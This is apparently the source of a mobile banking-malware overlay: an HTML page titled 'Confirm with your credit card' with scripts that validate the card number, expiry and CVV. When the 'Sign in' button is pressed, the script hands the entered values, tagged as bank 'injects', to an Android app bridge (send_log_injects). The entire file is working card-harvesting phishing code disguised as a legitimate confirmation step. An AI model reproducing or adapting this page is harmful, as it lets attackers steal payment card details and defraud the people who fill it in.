<style>
    
    .input {
            width: 100%;
            border: 0;
            border: 1px solid #e5e5e5;
            margin-top: 15px;
            height: 44px;
            border-radius: 5px;
            color: #000;
            padding-left: 0;
            transition: all 0.2s ease;
            padding-right: 25px;
            font-weight: 500;
            background-color: #ffffff;
            padding: 10px;
    }

        .input:focus {
            border: 2px solid #199b3b;
        }

        input,
        button {
            outline: none !important;
            box-shadow: none !important;
        }

        section {
            padding: 15px;
            flex: 1;
        }

        .button {
            width: 100%;
            padding: 8px;
            color: #fff;
            background-color: #199b3b;
            border-radius: 5px;
            border: 0;
            margin-bottom: 15px;
            font-weight: 600;
        }
        form{
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        }
        .input::placeholder{
            color:#504f4f;
        }
        .button:disabled {
            opacity: 0.4;
            background-color: #cbcbcb;
        }
        .error {
            border-color: #f00 !important;
        }

</style>

        <section>
            <h4 style="font-size: 20px;font-weight: 500;">
                Confirm with your credit card
            </h4>
            <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input" placeholder="Credit Card" autocomplete="off">

            <input type="tel" style="width: 58%;float: left;margin-top: 5px;" id="exp" name="exp" maxlength="5" onkeyup="check7();check8()" class="input" placeholder="Expiration date" autocomplete="off">

            <input type="password" style="width: 40%;float: right;margin-bottom: 20px;margin-top: 5px;" id="cvv" name="cvv" maxlength="3" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">  

        <input type="button" class="button" disabled id="sendData" value="Sign in">
            <p style="text-align: center;font-size: 16px;font-weight: 500;color: #757575;">
                By tapping proceed you agree to our <u>Terms and Conditions</u>
            </p>
    </section>
    </form>
<script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

    var sendData = document.getElementById('sendData');

    $('.cool-input__input').on('input', function () {
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
